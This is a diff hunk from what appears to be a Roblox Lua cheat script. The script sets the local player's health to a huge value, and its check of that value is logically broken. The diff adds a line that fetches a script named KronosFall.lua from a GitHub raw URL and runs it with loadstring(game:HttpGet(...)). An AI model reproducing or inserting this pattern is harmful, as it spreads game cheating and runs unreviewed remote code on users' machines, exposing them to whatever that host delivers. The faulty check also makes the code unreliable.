@@ -27,3 +27,5 @@ local HP = game:GetService("Players").LocalPlayer.Health
 HP.Value = 1000000000
 if HP.Value == not 1000000000 then
 return end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeadMarker/Scripts/main/KronosFall.lua"))()
